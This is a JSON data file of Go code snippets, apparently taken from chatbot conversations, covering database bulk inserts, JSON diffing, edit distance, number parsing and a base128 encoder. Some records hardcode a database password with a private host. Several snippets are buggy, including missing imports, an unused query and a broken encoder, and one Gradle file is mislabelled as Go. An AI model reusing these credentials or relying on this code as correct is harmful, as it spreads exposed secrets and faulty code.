{\n\t\tlog.Fatal(err)\n\t}\n\tdefer stmt.Close()\n\n\ttransferHists := []TransferHist{\n\t\t{\n\t\t\tCreateDtm:        time.Now(),\n\t\t\tTransferStartDtm: time.Now(),\n\t\t\tTransferEndDtm:   time.Now(),\n\t\t\tFileName:         \"example1.txt\",\n\t\t\tBytesSent:        1000,\n\t\t\tTransferType:     \"FTP\",\n\t\t\tDestination:      \"server1\",\n\t\t\tAttr1:            \"attr1\",\n\t\t\tAttr2:            \"attr2\",\n\t\t\tAttr3:            \"attr3\",\n\t\t\tLineCnt:          10,\n\t\t},\n\t\t{\n\t\t\tCreateDtm:        time.Now(),\n\t\t\tTransferStartDtm: time.Now(),\n\t\t\tTransferEndDtm:   time.Now(),\n\t\t\tFileName:         \"example2.txt\",\n\t\t\tBytesSent:        2000,\n\t\t\tTransferType:     \"HTTP\",\n\t\t\tDestination:      \"server2\",\n\t\t\tAttr1:            \"attr1\",\n\t\t\tAttr2:            \"attr2\",\n\t\t\tAttr3:            \"attr3\",\n\t\t\tLineCnt:          20,\n\t\t},\n\t\t// Добавьте другие элементы TransferHist по вашему усмотрению\n\t}\n\n\t// Создаем срез для хранения значений параметров\n\tvar values []interface{}\n\n\t// Создаем срез для хранения строки с плейсхолдерами\n\tvar placeholders []string\n\n\t// Обрабатываем каждый элемент transferHist\n\tfor _, transferHist := range transferHists {\n\t\tvalues = append(values,\n\t\t\ttransferHist.CreateDtm,\n\t\t\ttransferHist.TransferStartDtm,\n\t\t\ttransferHist.TransferEndDtm,\n\t\t\ttransferHist.FileName,\n\t\t\ttransferHist.BytesSent,\n\t\t\ttransferHist.TransferType,\n\t\t\ttransferHist.Destination,\n\t\t\ttransferHist.Attr1,\n\t\t\ttransferHist.Attr2,\n\t\t\ttransferHist.Attr3,\n\t\t\ttransferHist.LineCnt,\n\t\t)\n\t\tplaceholders = append(placeholders, \"(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\")\n\t}\n\n\t// Формируем SQL-запрос с плейсхолдерами для bulk insert\n\tsqlQuery := fmt.Sprintf(\"INSERT INTO transfer_hist (CREATE_DTM, TRANSFER_START_DTM, TRANSFER_END_DTM, FILE_NAME, BYTES_SENT, TRANSFER_TYPE, DESTINATION, ATTR_1, ATTR_2, ATTR_3, LINECNT) VALUES %s\", strings.Join(placeholders, \", \"))\n\n\t// Выполняем Bulk Insert с помощью подготовленного выражения\n\t_, err = stmt.Exec(values...)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"Bulk Insert complete\")\n}",
    "filename": "35e2166725025206b12f791030076a4b_3.go"
  },
  {
    "conversation_hash": "bae66cfe77bafdecc30470c499418158",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n\t\"database/sql\"\n\t\"fmt\"\n\t\"time\"\n\n\t_ \"github.com/go-sql-driver/mysql\"\n)\n\ntype TransferHist struct {\n\tCreateDtm        time.Time `xml:\"CREATE_DTM\"`\n\tTransferStartDtm time.Time `xml:\"TRANSFER_START_DTM\"`\n\tTransferEndDtm   time.Time `xml:\"TRANSFER_END_DTM\"`\n\tFileName         string    `xml:\"FILE_NAME\"`\n\tBytesSent        int64     `xml:\"BYTES_SENT\"`\n\tTransferType     string    `xml:\"TRANSFER_TYPE\"`\n\tDestination      string    `xml:\"DESTINATION\"`\n\tAttr1            string    `xml:\"ATTR_1\"`\n\tAttr2            string    `xml:\"ATTR_2\"`\n\tAttr3            string    `xml:\"ATTR_3\"`\n\tLineCnt          int       `xml:\"LINECNT\"`\n}\n\nfunc bulkInsertTransferHist(db *sql.DB, transfers []TransferHist) error {\n\t// Создаем строки для запроса вставки\n\tvalueStrings := make([]string, 0, len(transfers))\n\tvalueArgs := make([]interface{}, 0, len(transfers)*11)\n\n\tfor _, transfer := range transfers {\n\t\tvalueStrings = append(valueStrings, \"(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\")\n\t\tvalueArgs = append(valueArgs,\n\t\t\ttransfer.CreateDtm,\n\t\t\ttransfer.TransferStartDtm,\n\t\t\ttransfer.TransferEndDtm,\n\t\t\ttransfer.FileName,\n\t\t\ttransfer.BytesSent,\n\t\t\ttransfer.TransferType,\n\t\t\ttransfer.Destination,\n\t\t\ttransfer.Attr1,\n\t\t\ttransfer.Attr2,\n\t\t\ttransfer.Attr3,\n\t\t\ttransfer.LineCnt,\n\t\t)\n\t}\n\n\t// Создаем запрос INSERT с несколькими значениями\n\tstmt := fmt.Sprintf(\"INSERT INTO transfer_hist (CREATE_DTM, TRANSFER_START_DTM, TRANSFER_END_DTM, FILE_NAME, BYTES_SENT, TRANSFER_TYPE, DESTINATION, ATTR_1, ATTR_2, ATTR_3, LINECNT) VALUES %s\", strings.Join(valueStrings, \",\"))\n\n\t// Выполняем запрос с переданными значениями\n\t_, err := db.Exec(stmt, valueArgs...)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc main() {\n\t// Создаем подключение к базе данных\n\tdb, err := sql.Open(\"mysql\", \"user:password@tcp(127.0.0.1:3306)/database\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer db.Close()\n\n\t// Создаем срез с данными для вставки\n\ttransfers := []TransferHist{\n\t\tTransferHist{\n\t\t\tCreateDtm:        time.Now(),\n\t\t\tTransferStartDtm: time.Now(),\n\t\t\tTransferEndDtm:   time.Now(),\n\t\t\tFileName:         \"file1.txt\",\n\t\t\tBytesSent:        100,\n\t\t\tTransferType:     \"type1\",\n\t\t\tDestination:      \"destination1\",\n\t\t\tAttr1:            \"attr1\",\n\t\t\tAttr2:            \"attr2\",\n\t\t\tAttr3:            \"attr3\",\n\t\t\tLineCnt:          10,\n\t\t},\n\t\tTransferHist{\n\t\t\tCreateDtm:        time.Now(),\n\t\t\tTransferStartDtm: time.Now(),\n\t\t\tTransferEndDtm:   time.Now(),\n\t\t\tFileName:         \"file2.txt\",\n\t\t\tBytesSent:        200,\n\t\t\tTransferType:     \"type2\",\n\t\t\tDestination:      \"destination2\",\n\t\t\tAttr1:            \"attr4\",\n\t\t\tAttr2:            \"attr5\",\n\t\t\tAttr3:            \"attr6\",\n\t\t\tLineCnt:          20,\n\t\t},\n\t}\n\n\t// Вызываем функцию bulkInsertTransferHist для вставки данных\n\terr = bulkInsertTransferHist(db, transfers)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "bae66cfe77bafdecc30470c499418158_0.go"
  },
  {
    "conversation_hash": "d3fa04941d7ca6cfd5130651e974fb9a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"context\"\n    \"fmt\"\n    \"github.com/upper/db/v4\"\n    \"github.com/upper/db/v4/adapter/postgresql\"\n)\n\nfunc main() {\n    // Определяем контекст\n    ctx := context.TODO()\n\n    // Устанавливаем соединение с базой данных\n    settings := postgresql.ConnectionURL{\n        Host:     \"10.109.111.12\",\n        Port:     30870,\n        Database: \"billops-qa21-bg2\",\n        User:     \"postgres\",\n        Password: \"paSSw0rd\",\n    }\n    sess, err := postgresql.Open(settings)\n    if err != nil {\n        fmt.Printf(\"Ошибка при подключении к базе данных: %v\", err)\n        return\n    }\n\n    // Проверяем соединение\n    err = sess.Connection().PingContext(ctx)\n    if err != nil {\n        fmt.Printf(\"Ошибка при проверке соединения: %v\", err)\n        return\n    }\n\n    defer sess.Close()\n\n    // Выполняем дополнительные операции с базой данных\n\n    // ...\n}",
    "filename": "d3fa04941d7ca6cfd5130651e974fb9a_0.go"
  },
  {
    "conversation_hash": "d3fa04941d7ca6cfd5130651e974fb9a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"context\"\n    \"fmt\"\n    \"github.com/upper/db/v4\"\n    \"github.com/upper/db/v4/adapter/postgresql\"\n)\n\n// Определяем структуру для данных\ntype Person struct {\n    ID   int    `db:\"id\"`\n    Name string `db:\"name\"`\n    Age  int    `db:\"age\"`\n}\n\nfunc main() {\n    // Определяем контекст\n    ctx := context.TODO()\n\n    // Устанавливаем соединение с базой данных\n    settings := postgresql.ConnectionURL{\n        Host:     \"10.109.111.12\",\n        Port:     30870,\n        Database: \"billops-qa21-bg2\",\n        User:     \"postgres\",\n        Password: \"paSSw0rd\",\n    }\n    sess, err := postgresql.Open(settings)\n    if err != nil {\n        fmt.Printf(\"Ошибка при подключении к базе данных: %v\", err)\n        return\n    }\n\n    // Проверяем соединение\n    err = sess.Connection().PingContext(ctx)\n    if err != nil {\n        fmt.Printf(\"Ошибка при проверке соединения: %v\", err)\n        return\n    }\n\n    defer sess.Close()\n\n    // Создаем срез данных для bulk insert\n    people := []Person{\n        {ID: 1, Name: \"John\", Age: 30},\n        {ID: 2, Name: \"Jane\", Age: 25},\n        {ID: 3, Name: \"Bob\", Age: 40},\n    }\n\n    // Выполняем bulk insert\n    _, err = sess.Collection(\"people\").Insert().Bulk(people).ExecContext(ctx)\n    if err != nil {\n        fmt.Printf(\"Ошибка при bulk insert: %v\", err)\n        return\n    }\n\n    fmt.Println(\"Bulk insert выполнен успешно!\")\n}",
    "filename": "d3fa04941d7ca6cfd5130651e974fb9a_1.go"
  },
  {
    "conversation_hash": "8ea77654eee8f591ae532bbb96b53871",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"database/sql\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"github.com/jmoiron/sqlx\"\n\t_ \"github.com/lib/pq\"\n)\n\ntype TransferHist struct {\n\tCreateDtm        time.Time `xml:\"CREATE_DTM\"`\n\tTransferStartDtm time.Time `xml:\"TRANSFER_START_DTM\"`\n\tTransferEndDtm   time.Time `xml:\"TRANSFER_END_DTM\"`\n\tFileName         string    `xml:\"FILE_NAME\"`\n\tBytesSent        int64     `xml:\"BYTES_SENT\"`\n\tTransferType     string    `xml:\"TRANSFER_TYPE\"`\n\tDestination      string    `xml:\"DESTINATION\"`\n\tAttr1            string    `xml:\"ATTR_1\"`\n\tAttr2            string    `xml:\"ATTR_2\"`\n\tAttr3            string    `xml:\"ATTR_3\"`\n\tLineCnt          int       `xml:\"LINECNT\"`\n}\n\nfunc main() {\n\tdb, err := sql.Open(\"postgres\", \"postgres://postgres:paSSw0rd@10.109.111.12:30870/billops-qa21-bg2\")\n\tif err != nil {\n\t\tfmt.Println(\"Failed to connect to database:\", err)\n\t\treturn\n\t}\n\tdefer db.Close()\n\n\tsqlxDb := sqlx.NewDb(db, \"postgres\")\n\n\ttransferHist := []TransferHist{\n\t\t{time.Now(), time.Now(), time.Now(), \"file1\", 100, \"type1\", \"destination1\", \"attr1\", \"attr2\", \"attr3\", 10},\n\t\t{time.Now(), time.Now(), time.Now(), \"file2\", 200, \"type2\", \"destination2\", \"attr4\", \"attr5\", \"attr6\", 20},\n\t\t// Add more TransferHist objects here as needed\n\t}\n\n\tquery := \"INSERT INTO tablename (create_dtm, transfer_start_dtm, transfer_end_dtm, file_name, bytes_sent, transfer_type, destination, attr_1, attr_2, attr_3, linecnt) VALUES (:create_dtm, :transfer_start_dtm, :transfer_end_dtm, :file_name, :bytes_sent, :transfer_type, :destination, :attr_1, :attr_2, :attr_3, :linecnt)\"\n\n\ttx, err := sqlxDb.BeginTxx(context.Background(), nil)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to begin transaction:\", err)\n\t\treturn\n\t}\n\n\tstmt, err := tx.PrepareNamed(query)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to prepare statement:\", err)\n\t\treturn\n\t}\n\tdefer stmt.Close()\n\n\tfor _, th := range transferHist {\n\t\t_, err := stmt.Exec(th)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Failed to execute statement:\", err)\n\t\t\ttx.Rollback()\n\t\t\treturn\n\t\t}\n\t}\n\n\tif err := tx.Commit(); err != nil {\n\t\tfmt.Println(\"Failed to commit transaction:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Bulk insert completed successfully\")\n}",
    "filename": "8ea77654eee8f591ae532bbb96b53871_0.go"
  },
  {
    "conversation_hash": "8ea77654eee8f591ae532bbb96b53871",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"database/sql\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"github.com/lib/pq\"\n)\n\ntype TransferHist struct {\n\tCreateDtm        time.Time `xml:\"CREATE_DTM\"`\n\tTransferStartDtm time.Time `xml:\"TRANSFER_START_DTM\"`\n\tTransferEndDtm   time.Time `xml:\"TRANSFER_END_DTM\"`\n\tFileName         string    `xml:\"FILE_NAME\"`\n\tBytesSent        int64     `xml:\"BYTES_SENT\"`\n\tTransferType     string    `xml:\"TRANSFER_TYPE\"`\n\tDestination      string    `xml:\"DESTINATION\"`\n\tAttr1            string    `xml:\"ATTR_1\"`\n\tAttr2            string    `xml:\"ATTR_2\"`\n\tAttr3            string    `xml:\"ATTR_3\"`\n\tLineCnt          int       `xml:\"LINECNT\"`\n}\n\nfunc main() {\n\tconnStr := \"postgres://postgres:paSSw0rd@10.109.111.12:30870/billops-qa21-bg2\"\n\tdb, err := sql.Open(\"postgres\", connStr)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to connect to database:\", err)\n\t\treturn\n\t}\n\tdefer db.Close()\n\n\ttransferHist := []TransferHist{\n\t\t{time.Now(), time.Now(), time.Now(), \"file1\", 100, \"type1\", \"destination1\", \"attr1\", \"attr2\", \"attr3\", 10},\n\t\t{time.Now(), time.Now(), time.Now(), \"file2\", 200, \"type2\", \"destination2\", \"attr4\", \"attr5\", \"attr6\", 20},\n\t}\n\n\ttxn, err := db.BeginTx(context.Background(), nil)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to begin transaction:\", err)\n\t\treturn\n\t}\n\n\tstmt, err := txn.Prepare(pq.CopyIn(\"table_name\", \"create_dtm\", \"transfer_start_dtm\", \"transfer_end_dtm\", \"file_name\", \"bytes_sent\", \"transfer_type\", \"destination\", \"attr_1\", \"attr_2\", \"attr_3\", \"linecnt\"))\n\tif err != nil {\n\t\tfmt.Println(\"Failed to prepare statement:\", err)\n\t\treturn\n\t}\n\n\tdefer stmt.Close()\n\n\tfor _, th := range transferHist {\n\t\t_, err = stmt.Exec(th.CreateDtm, th.TransferStartDtm, th.TransferEndDtm, th.FileName, th.BytesSent, th.TransferType, th.Destination, th.Attr1, th.Attr2, th.Attr3, th.LineCnt)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Failed to execute statement:\", err)\n\t\t\ttxn.Rollback()\n\t\t\treturn\n\t\t}\n\t}\n\n\t_, err = stmt.Exec()\n\tif err != nil {\n\t\tfmt.Println(\"Failed to execute statement:\", err)\n\t\ttxn.Rollback()\n\t\treturn\n\t}\n\n\terr = stmt.Close()\n\tif err != nil {\n\t\tfmt.Println(\"Failed to close statement:\", err)\n\t\treturn\n\t}\n\n\terr = txn.Commit()\n\tif err != nil {\n\t\tfmt.Println(\"Failed to commit transaction:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Bulk insert completed successfully\")\n}",
    "filename": "8ea77654eee8f591ae532bbb96b53871_1.go"
  },
  {
    "conversation_hash": "17abb15346b317dd94e426d17d5601a5",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"reflect\"\n)\n\nfunc main() {\n\tjson1 := `{\"name\":\"John\", \"age\":30, \"city\":\"New York\"}`\n\tjson2 := `{\"name\":\"John\", \"age\":35, \"city\":\"Chicago\"}`\n\n\tvar obj1 interface{}\n\tvar obj2 interface{}\n\n\terr := json.Unmarshal([]byte(json1), &obj1)\n\tif err != nil {\n\t\tfmt.Println(\"Error parsing JSON 1:\", err)\n\t\treturn\n\t}\n\n\terr = json.Unmarshal([]byte(json2), &obj2)\n\tif err != nil {\n\t\tfmt.Println(\"Error parsing JSON 2:\", err)\n\t\treturn\n\t}\n\n\tfindDifference(obj1, obj2, \"\")\n}\n\nfunc findDifference(obj1, obj2 interface{}, path string) {\n\tswitch reflect.TypeOf(obj1).Kind() {\n\tcase reflect.Slice:\n\t\tslice1, ok1 := obj1.([]interface{})\n\t\tslice2, ok2 := obj2.([]interface{})\n\t\tif !ok1 || !ok2 {\n\t\t\tprintDifference(path)\n\t\t\treturn\n\t\t}\n\n\t\tfor i := 0; i < len(slice1); i++ {\n\t\t\tfindDifference(slice1[i], slice2[i], fmt.Sprintf(\"%s[%d]\", path, i))\n\t\t}\n\n\tcase reflect.Map:\n\t\tmap1, ok1 := obj1.(map[string]interface{})\n\t\tmap2, ok2 := obj2.(map[string]interface{})\n\t\tif !ok1 || !ok2 {\n\t\t\tprintDifference(path)\n\t\t\treturn\n\t\t}\n\n\t\tfor key, val1 := range map1 {\n\t\t\tif val2, ok := map2[key]; ok {\n\t\t\t\tfindDifference(val1, val2, fmt.Sprintf(\"%s.%s\", path, key))\n\t\t\t} else {\n\t\t\t\tprintDifference(fmt.Sprintf(\"%s.%s\", path, key))\n\t\t\t}\n\t\t}\n\n\t\tfor key := range map2 {\n\t\t\tif _, ok := map1[key]; !ok {\n\t\t\t\tprintDifference(fmt.Sprintf(\"%s.%s\", path, key))\n\t\t\t}\n\t\t}\n\n\tdefault:\n\t\tif !reflect.DeepEqual(obj1, obj2) {\n\t\t\tprintDifference(path)\n\t\t}\n\t}\n}\n\nfunc printDifference(path string) {\n\tfmt.Println(\"Different location:\", path)\n}",
    "filename": "17abb15346b317dd94e426d17d5601a5_0.go"
  },
  {
    "conversation_hash": "fe92c49f82db9c533fc120446cc0d005",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc minDistance(word1 string, word2 string) int {\n\tm, n := len(word1), len(word2)\n\tdp := make([][]int, m+1)\n\tfor i := 0; i <= m; i++ {\n\t\tdp[i] = make([]int, n+1)\n\t\tdp[i][0] = i\n\t}\n\tfor j := 0; j <= n; j++ {\n\t\tdp[0][j] = j\n\t}\n\n\tfor i := 1; i <= m; i++ {\n\t\tfor j := 1; j <= n; j++ {\n\t\t\tif word1[i-1] == word2[j-1] {\n\t\t\t\tdp[i][j] = dp[i-1][j-1]\n\t\t\t} else {\n\t\t\t\tdp[i][j] = min(dp[i-1][j-1]+1, min(dp[i][j-1]+1, dp[i-1][j]+1))\n\t\t\t}\n\t\t}\n\t}\n\n\treturn dp[m][n]\n}\n\nfunc min(a, b int) int {\n\tif a < b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc main() {\n\tword1 := \"kitten\"\n\tword2 := \"sitting\"\n\tdistance := minDistance(word1, word2)\n\tfmt.Printf(\"最小编辑距离为：%d\\n\", distance)\n}",
    "filename": "fe92c49f82db9c533fc120446cc0d005_0.go"
  },
  {
    "conversation_hash": "7a08f3eb5d4518dc8475365a06be5a43",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n\n    \"github.com/gocql/gocql\"\n    \"github.com/scylladb/gocqlx\"\n    \"github.com/scylladb/gocqlx/qb\"\n)\n\ntype User struct {\n    ID   int    `db:\"id\"`\n    Name string `db:\"name\"`\n}\n\nfunc main() {\n    // 创建并配置Cassandra集群\n    cluster := gocql.NewCluster(\"127.0.0.1\") // 使用默认端口9042\n    cluster.Keyspace = \"my_keyspace\"\n    session, err := cluster.CreateSession()\n    if err != nil {\n        panic(err)\n    }\n    defer session.Close()\n\n    // 查询数据\n    var user User\n    stmt := qb.Select(\"my_table\").Where(qb.Eq(\"id\")).Limit(1).ToQuery(session)\n    if err := gocqlx.Select(&user, stmt.Query, stmt.Args...); err != nil {\n        fmt.Println(\"Error querying Cassandra:\", err)\n        return\n    }\n\n    fmt.Printf(\"ID: %d, Name: %s\\n\", user.ID, user.Name)\n}",
    "filename": "7a08f3eb5d4518dc8475365a06be5a43_1.go"
  },
  {
    "conversation_hash": "2c10a5e561bffec889c1d643929e67dc",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n)\n\nfunc main() {\n\tnum := -5\n\tabsNum := math.Abs(float64(num))\n\t\n\tfmt.Println(\"绝对值：\", absNum)\n}",
    "filename": "2c10a5e561bffec889c1d643929e67dc_0.go"
  },
  {
    "conversation_hash": "f93a25937444318bab55b55789951b90",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math\"\n)\n\nfunc main() {\n\tnum := -10\n\tabsNum := math.Abs(float64(num))\n\tfmt.Println(int(absNum))\n}",
    "filename": "f93a25937444318bab55b55789951b90_0.go"
  },
  {
    "conversation_hash": "a122c3aab0e5b3ce11a59815248aac95",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    procMessageBoxW.Call(0,\n        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(\"Hello, Windows API!\"))),\n        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(\"Golang Windows API Example\"))),\n        uintptr(0))\n}",
    "filename": "a122c3aab0e5b3ce11a59815248aac95_2.go"
  },
  {
    "conversation_hash": "09388f7ea399ba46a202cf34e7577f07",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "line, err := reader.ReadString('\\n')\nif err != nil {\n    // handle the error\n}\n\nline = strings.Trim(line, \"\\r\\n\")\n\ngo func() {\n    // process the message in a separate goroutine\n    // this can include parsing, validation, and any other necessary operations\n    processMessage(line)\n\n    // perform any necessary cleanup after processing the message\n}()",
    "filename": "09388f7ea399ba46a202cf34e7577f07_0.go"
  },
  {
    "conversation_hash": "70071e2eb584daafc5a69209e075915e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    id 'java'\n    id 'com.github.johnrengelman.shadow' version '7.1.2'\n}\n\ngroup 'com.example'\nversion '1.0-SNAPSHOT'\n\nsourceCompatibility = 1.8\n\nrepositories {\n    mavenCentral()\n}\n\ndependencies {\n    implementation 'org.some:needed-dependency:1.0.0'\n    implementation 'org.other:needed-dependency:2.0.0'\n    testImplementation 'junit:junit:4.12'\n}\n\nshadowJar {\n    exclude 'unnecessary/**' // исключение ненужных директорий или файлов из Fat JAR\n}",
    "filename": "70071e2eb584daafc5a69209e075915e_0.go"
  },
  {
    "conversation_hash": "bdb4dcf8fd04da56b186aed1cdc4c7b0",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\nfunc main() {\n\ts := \"12345\"\n\tnum, err := strconv.ParseInt(s, 10, 64)\n\tif err != nil {\n\t\tfmt.Println(\"解析失败：\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"解析结果：\", num)\n}",
    "filename": "bdb4dcf8fd04da56b186aed1cdc4c7b0_1.go"
  },
  {
    "conversation_hash": "fafb6355aa58c92fe1fca8ca2ad7843f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    // Create a slice to hold the maps\n    arr := make([]map[string]int, 0)\n\n    // Create a map\n    m1 := make(map[string]int)\n    m1[\"A\"] = 1\n    m1[\"B\"] = 2\n\n    // Append the map to the slice\n    arr = append(arr, m1)\n\n    // Create another map\n    m2 := make(map[string]int)\n    m2[\"C\"] = 3\n    m2[\"D\"] = 4\n\n    // Append the second map to the slice\n    arr = append(arr, m2)\n\n    // Print the array of maps\n    fmt.Println(arr)\n}",
    "filename": "fafb6355aa58c92fe1fca8ca2ad7843f_0.go"
  },
  {
    "conversation_hash": "fafb6355aa58c92fe1fca8ca2ad7843f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    // Create a map with string keys and array values\n    m := make(map[string][]int)\n\n    // Create an array and add it to the map\n    arr1 := []int{1, 2, 3, 4}\n    m[\"A\"] = arr1\n\n    // Create another array and add it to the map\n    arr2 := []int{5, 6, 7, 8}\n    m[\"B\"] = arr2\n\n    // Print the map\n    fmt.Println(m)\n}",
    "filename": "fafb6355aa58c92fe1fca8ca2ad7843f_1.go"
  },
  {
    "conversation_hash": "fafb6355aa58c92fe1fca8ca2ad7843f",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    // Create a map with string keys and array values\n    m := make(map[string][]int)\n\n    // Create an array and add it to the map\n    arr1 := []int{1, 2, 3, 4}\n    m[\"A\"] = arr1\n\n    // Create another array and add it to the map\n    arr2 := []int{5, 6, 7, 8}\n    m[\"B\"] = arr2\n\n    // Search for a value in the map\n    searchValue := 6\n    found := false\n    for _, arr := range m {\n        for _, val := range arr {\n            if val == searchValue {\n                found = true\n                break\n            }\n        }\n        if found {\n            break\n        }\n    }\n\n    // Print the search result\n    if found {\n        fmt.Println(\"Value found in the map\")\n    } else {\n        fmt.Println(\"Value not found in the map\")\n    }\n}",
    "filename": "fafb6355aa58c92fe1fca8ca2ad7843f_2.go"
  },
  {
    "conversation_hash": "dee77f34a27ce9ec7c4f45473eb31f8a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tlayout := \"2006-01-02 15:04:05\"\n\tstr := \"2022-01-01 12:30:00\"\n\tt, err := time.Parse(layout, str)\n\tif err != nil {\n\t\tfmt.Println(\"时间转换错误:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(t)\n}",
    "filename": "dee77f34a27ce9ec7c4f45473eb31f8a_0.go"
  },
  {
    "conversation_hash": "dee77f34a27ce9ec7c4f45473eb31f8a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\nfunc main() {\n\tstr := \"12345\"\n\tnum, err := strconv.Atoi(str)\n\tif err != nil {\n\t\tfmt.Println(\"转换错误:\", err)\n\t\treturn\n\t}\n\n\tif num < -128 || num > 127 {\n\t\tfmt.Println(\"超出8位整数范围\")\n\t\treturn\n\t}\n\n\tint8Num := int8(num)\n\tfmt.Println(int8Num)\n}",
    "filename": "dee77f34a27ce9ec7c4f45473eb31f8a_2.go"
  },
  {
    "conversation_hash": "dee77f34a27ce9ec7c4f45473eb31f8a",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\nfunc main() {\n\tstr := \"1234567890\"\n\tnum, err := strconv.Atoi(str)\n\tif err != nil {\n\t\tfmt.Println(\"转换错误:\", err)\n\t\treturn\n\t}\n\n\tif int64(num) < -2147483648 || int64(num) > 2147483647 {\n\t\tfmt.Println(\"超出32位整数范围\")\n\t\treturn\n\t}\n\n\tint32Num := int32(num)\n\tfmt.Println(int32Num)\n}",
    "filename": "dee77f34a27ce9ec7c4f45473eb31f8a_3.go"
  },
  {
    "conversation_hash": "1016c07422bcb2b067c9d927954b08c2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\nconst base128Chars = \"ĀĂĄĆĈĊČĎĐĒĔĖĘĚĜĞĠĢĤĦĨĪĬĮİĲĴĶĹĻĽĿŁŃŅŇŊŌŎŐŒŔŖŘŚŜŞŠŢŤŦŨŪŬŮŰŲŴŶŸŹŻŽńņňŉŋōŏőœŕŗřśŝşšţťŧũūŭůűųŵŷżž\"\nconst base128TableSize = 128\n\nfunc main() {\n\t// Test base128 encoding and decoding\n\tmessage := \"Hello, world!\"\n\tfmt.Println(\"Original Message:\", message)\n\n\tencoded := base128Encode(message)\n\tfmt.Println(\"Encoded Message:\", encoded)\n\n\tdecoded := base128Decode(encoded)\n\tfmt.Println(\"Decoded Message:\", decoded)\n}\n\nfunc base128Encode(message string) string {\n\tvar encoded []string\n\n\tfor _, char := range message {\n\t\tencoded = append(encoded, string(base128Chars[char]))\n\t}\n\treturn strings.Join(encoded, \"\")\n}\n\nfunc base128Decode(encoded string) string {\n\tvar decoded []rune\n\n\tfor _, char := range encoded {\n\t\tdecoded = append(decoded, rune(strings.IndexRune(base128Chars, char)))\n\t}\n\treturn string(decoded)\n}",
    "filename": "1016c07422bcb2b067c9d927954b08c2_0.go"
  },
  {
    "conversation_hash": "1016c07422bcb2b067c9d927954b08c2",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n)\n\nconst base128Chars = \"ĀĂĄĆĈĊČĎĐĒĔĖĘĚĜĞĠĢĤĦĨĪĬĮİĲĴĶĹĻĽĿŁŃŅŇŊŌŎŐŒŔŖŘŚŜŞŠŢŤŦŨŪŬŮŰŲŴŶŸŹŻŽńņňŉŋōŏőœŕŗřśŝşšţťŧũūŭůűųŵŷżž\"\nconst base128TableSize = 128\n\nfunc main() {\n\tfmt.Println(\"Welcome to Base128 Encoding/Decoding Program\")\n\treader := bufio.NewReader(os.Stdin)\n\n\tfor {\n\t\tfmt.Print(\"\\nEnter 'e' to encode, 'd' to decode, or 'q' to quit: \")\n\t\toption, err := reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error reading option:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\toption = strings.ToLower(strings.TrimSpace(option))\n\n\t\tswitch option {\n\t\tcase \"e\":\n\t\t\tfmt.Print(\"Enter the text to encode: \")\n\t\t\ttext, err := reader.ReadString('\\n')\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"Error 